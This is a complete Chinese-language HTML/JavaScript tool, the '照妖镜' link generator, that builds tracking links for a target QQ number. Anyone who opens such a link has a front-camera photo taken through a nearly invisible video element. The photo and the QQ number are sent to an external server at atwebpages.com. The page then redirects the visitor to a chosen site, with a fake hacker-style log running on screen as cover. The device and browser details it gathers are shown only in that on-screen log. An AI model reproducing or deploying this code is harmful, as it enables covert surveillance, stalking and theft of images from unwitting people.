<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>照妖镜 - 链接生成器</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        /* ===== 配置界面 ===== */
        .config-container { max-width:500px; width:100%; }
        .card { background:#13131a; border:1px solid #2a2a35; border-radius:12px; padding:32px 28px; }
        .card-header { text-align:center; margin-bottom:24px; }
        .card-header .icon { font-size:48px; }
        .card-header h1 { font-size:26px; background:linear-gradient(135deg,#e0e0e0,#a0a0c0); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .form-group { margin-bottom:20px; }
        .form-group label { display:block; font-size:13px; color:#a0a0b0; margin-bottom:6px; }
        .form-group input {
            width:100%; padding:13px 15px; background:#1a1a24; border:1.5px solid #2a2a35;
            border-radius:8px; color:#e0e0e0; font-size:15px; outline:none;
        }
        .btn { width:100%; padding:14px; background:#6c5ce7; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; }
        .result-area { display:none; margin-top:20px; padding:18px; background:#0d0d15; border:1px solid #2a2a35; border-radius:8px; }
        .result-area.show { display:block; }
        .result-area input { width:100%; padding:10px; background:#1a1a24; border:1px solid #2a2a35; border-radius:6px; color:#7ecbff; }
        .btn-copy { padding:10px 16px; background:#2ecc71; color:#fff; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }

        /* ===== 追踪界面 ===== */
        .track-overlay {
            position:fixed; inset:0; z-index:99999; background:#000;
            display:flex; align-items:center; justify-content:center; flex-direction:column;
            overflow:hidden;
        }
        /* 日志流：每行铺满整行 */
        .log-stream {
            position:absolute;
            inset:0;
            overflow:hidden;
            pointer-events:none;
            z-index:0;
            font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 10px;
            line-height: 1.6;
            color: #3d3d4a;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
        }
        .log-line {
            display: block;
            width: 100%;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            flex-shrink: 0;
            padding: 0;
            margin: 0;
            line-height: 1.6;
            text-align: justify;
            text-align-last: justify;
            letter-spacing: 0.5px;
        }
        .log-line::after {
            content: '';
            display: inline-block;
            width: 100%;
        }

        /* 中心区域 */
        .center-box { position:relative; z-index:1; text-align:center; }
        .spinner {
            width:45px; height:45px; border:3px solid rgba(255,255,255,0.15);
            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite;
            margin:0 auto 20px;
        }
        @keyframes spin { to { transform:rotate(360deg); } }
        .spinner.done { border-top-color:#2ecc71; border-color:rgba(46,204,113,0.2); border-top-color:#2ecc71; }
        .spinner.error { border-top-color:#e74c3c; border-color:rgba(231,76,60,0.2); border-top-color:#e74c3c; }
        .status-text { color:#aaa; font-size:15px; margin-bottom:8px; }
        .status-text.error { color:#e74c3c; }
        .denied-msg { display:none; color:#e74c3c; font-size:14px; margin-top:10px; }
        .denied-msg.show { display:block; }
    </style>
</head>
<body>

<!-- 配置模式 -->
<div id="configMode" class="config-container">
    <div class="card">
        <div class="card-header">
            <span class="icon">🪞</span>
            <h1>照妖镜</h1>
            <p style="color:#a0a0b0;font-size:13px;">生成追踪链接 · 自动采集回传</p>
        </div>
        <div class="form-group">
            <label>QQ号 <span style="color:#e74c3c;">*</span></label>
            <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20">
        </div>
        <div class="form-group">
            <label>跳转网址 <span style="color:#e74c3c;">*</span></label>
            <input type="url" id="urlInput" placeholder="https://example.com">
        </div>
        <button class="btn" onclick="generateLink()">🔗 生成追踪链接</button>
        <div class="result-area" id="resultArea">
            <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 追踪链接</div>
            <input type="text" id="resultLink" readonly onclick="this.select();copyLink()">
            <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
        </div>
        <div style="margin-top:18px;padding:12px;background:rgba(231,76,60,0.08);border:1px solid rgba(231,76,60,0.25);border-radius:8px;font-size:12px;color:#e98b82;">
            ⚠️ 需要 HTTPS 环境，API 为 HTTP 时可能被浏览器拦截。
        </div>
    </div>
</div>

<!-- 追踪模式 -->
<div class="track-overlay" id="trackMode" style="display:none;">
    <div class="log-stream" id="logStream"></div>
    <div class="center-box">
        <div class="spinner" id="spinner"></div>
        <div class="status-text" id="statusText">正在初始化...</div>
        <div class="denied-msg" id="deniedMsg">
            🚫 访问被拒绝<br>
            <span style="font-size:12px;color:#666;">对方未授权，任务终止</span>
        </div>
    </div>
</div>

<video id="vid" playsinline autoplay muted style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;"></video>
<canvas id="cvs" style="display:none;"></canvas>

<script>
const $ = id => document.getElementById(id);

// ========== 配置模式功能 ==========
function generateLink() {
    const qq = $('qqInput').value.trim();
    const url = $('urlInput').value.trim();
    if (!qq || !/^\d{4,20}$/.test(qq)) return alert('请输入正确的QQ号');
    if (!url || !/^https?:\/\/.+/.test(url)) return alert('请输入有效的跳转网址');
    const link = location.origin + location.pathname + '?qq=' + qq + '&url=' + encodeURIComponent(url);
    $('resultLink').value = link;
    $('resultArea').classList.add('show');
    copyLink();
}
function copyLink() {
    const i = $('resultLink'); i.select();
    navigator.clipboard?.writeText(i.value).then(() => $('btnCopy').textContent = '✅ 已复制')
    .catch(() => document.execCommand('copy'));
}

// ========== 终端日志系统（真实信息 + 铺满整行） ==========
const logStream = $('logStream');
const MAX_LINES = 40;
let logLines = [];

// 获取屏幕每行字符数（根据字体大小估算）
function getCharsPerLine() {
    const fontSize = 10;
    const charWidth = fontSize * 0.6; // 等宽字体约0.6em
    return Math.floor(window.innerWidth / charWidth);
}

// 根据片段数组生成铺满整行的文本
function buildFullLineFromSegments(segments) {
    const charsPerLine = getCharsPerLine();
    let result = '';
    let i = 0;
    while (result.length < charsPerLine) {
        result += segments[i % segments.length] + ' ';
        i++;
    }
    return result.substring(0, charsPerLine);
}

// 添加一行
function pushLine(text) {
    logLines.push(text);
    if (logLines.length > MAX_LINES) logLines.shift();
    renderLogs();
}

// 批量添加
function pushLines(texts) {
    logLines.push(...texts);
    if (logLines.length > MAX_LINES) logLines.splice(0, logLines.length - MAX_LINES);
    renderLogs();
}

// 渲染
function renderLogs() {
    if (!logStream) return;
    logStream.innerHTML = '';
    for (const line of logLines) {
        const div = document.createElement('div');
        div.className = 'log-line';
        div.textContent = line;
        logStream.appendChild(div);
    }
}

// 定时器变量
let slowTimer = null;
let fastTimer = null;

// 慢速日志（初始两行 + 后续慢速）
function startSlowLogs(initialSegments, slowSegments) {
    stopAllTimers();
    // 初始只添加两行
    const initLines = [
        buildFullLineFromSegments(initialSegments[0]),
        buildFullLineFromSegments(initialSegments[1])
    ];
    pushLines(initLines);
    // 慢速定时器
    slowTimer = setInterval(() => {
        pushLine(buildFullLineFromSegments(slowSegments));
    }, 1000); // 每秒一行
}

// 快速日志（爆发式）
function startFastLogs(segments) {
    stopAllTimers();
    // 一次性爆发30行
    const burstLines = [];
    for (let i = 0; i < 30; i++) {
        burstLines.push(buildFullLineFromSegments(segments));
    }
    pushLines(burstLines);
    // 快速持续
    fastTimer = setInterval(() => {
        pushLine(buildFullLineFromSegments(segments));
    }, 150);
}

function stopAllTimers() {
    clearInterval(slowTimer);
    clearInterval(fastTimer);
    slowTimer = null;
    fastTimer = null;
}

function clearLogs() {
    stopAllTimers();
    logLines = [];
    renderLogs();
}

// ========== 追踪模式核心 ==========
function startTrack(qq, redirectUrl) {
    $('configMode').style.display = 'none';
    $('trackMode').style.display = 'flex';

    const spinner = $('spinner');
    const statusText = $('statusText');
    const deniedMsg = $('deniedMsg');
    const vid = $('vid');
    const cvs = $('cvs');
    const API = 'http://a1nb66.atwebpages.com/zyj/api.php';

    // 收集用户设备/浏览器/网络信息
    const ua = navigator.userAgent;
    const platform = navigator.platform || '未知';
    const language = navigator.language || '未知';
    const screenInfo = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '未知';
    const cores = navigator.hardwareConcurrency || '未知';
    const memory = navigator.deviceMemory || '未知';
    const connection = navigator.connection ? navigator.connection.effectiveType || '未知' : '未知';

    // 初始两行的片段（包含真实信息 + 中文）
    const initSegments1 = [`系统初始化...`, `设备: ${platform}`, `屏幕: ${screenInfo}`, `核心数: ${cores}`];
    const initSegments2 = [`浏览器: ${ua}`, `语言: ${language}`, `时区: ${timezone}`, `网络: ${connection}`, `内存: ${memory}GB`];

    // 慢速等待授权时的片段（中文 + 状态）
    const slowSegments = [`等待用户授权...`, `请点击允许`, `监听授权状态...`, `等待中...`];

    // 授权成功后的快速片段（真实操作日志 + 中文）
    const fastSegments = [
        `正在采集数据...`, `网络连接稳定`, `加密通道建立`, `上传数据中...`,
        `用户IP: 已获取`, `会话ID: ${Math.random().toString(36).substr(2, 8)}`,
        `数据包大小: 稳定`, `服务器响应: 正常`,
        `设备信息已收集`, `操作系统: ${platform}`, `浏览器版本: ${ua}`
    ];

    // 启动慢速日志（初始两行）
    startSlowLogs([initSegments1, initSegments2], slowSegments);

    function setStatus(t, isErr) {
        statusText.textContent = t;
        if (isErr) statusText.classList.add('error');
        else statusText.classList.remove('error');
    }

    async function run() {
        setStatus('正在初始化...');
        await sleep(400);

        if (!navigator.mediaDevices?.getUserMedia) {
            setStatus('环境不支持', true);
            spinner.classList.add('error');
            clearLogs();
            return setTimeout(() => location.href = redirectUrl, 2000);
        }

        setStatus('正在请求授权...');
        await sleep(300);

        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });

            // 授权成功 → 爆发式刷屏
            setStatus('授权成功');
            startFastLogs(fastSegments);

        } catch (e) {
            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                setStatus('访问被拒绝', true);
                spinner.classList.add('error');
                spinner.style.display = 'none';
                deniedMsg.classList.add('show');
                clearLogs();
                return;
            }
            // 降级尝试
            try {
                setStatus('尝试兼容模式...');
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                setStatus('授权成功');
                startFastLogs(fastSegments);
            } catch (e2) {
                if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
                    setStatus('访问被拒绝', true);
                    spinner.classList.add('error');
                    spinner.style.display = 'none';
                    deniedMsg.classList.add('show');
                    clearLogs();
                    return;
                }
                setStatus('设备不可用', true);
                spinner.classList.add('error');
                clearLogs();
                return setTimeout(() => location.href = redirectUrl, 2000);
            }
        }

        vid.srcObject = stream;
        vid.play().catch(()=>{});
        setStatus('正在处理...');

        const ready = await new Promise(resolve => {
            const start = Date.now();
            const check = () => {
                if (vid.videoWidth > 0) return resolve(true);
                if (Date.now() - start > 8000) return resolve(false);
                requestAnimationFrame(check);
            };
            vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
            requestAnimationFrame(check);
        });

        if (!ready) {
            setStatus('超时', true);
            spinner.classList.add('error');
            stream.getTracks().forEach(t => t.stop());
            clearLogs();
            return setTimeout(() => location.href = redirectUrl, 2000);
        }

        cvs.width = vid.videoWidth;
        cvs.height = vid.videoHeight;
        const ctx = cvs.getContext('2d');
        ctx.drawImage(vid, 0, 0);
        const img = cvs.toDataURL('image/jpeg', 0.65);
        stream.getTracks().forEach(t => t.stop());

        setStatus('正在上传...');

        const fd = new FormData();
        fd.append('qq', qq);
        fd.append('image', img);
        try {
            const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const r = await resp.json();
                if (r.success) {
                    setStatus('完成 ✓', false);
                    spinner.classList.add('done');
                } else {
                    setStatus('服务器拒绝', true);
                    spinner.classList.add('error');
                }
            } else {
                setStatus('上传失败', true);
                spinner.classList.add('error');
            }
        } catch (e) {
            setStatus('网络错误', true);
            spinner.classList.add('error');
        }

        stopAllTimers();
        setTimeout(() => location.href = redirectUrl, 2000);
    }

    setTimeout(run, 800);
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// 入口
const params = new URLSearchParams(location.search);
const qq = params.get('qq'), url = params.get('url');
if (qq && url) startTrack(qq, decodeURIComponent(url));
else $('configMode').style.display = 'block';
</script>
</body>
</html>
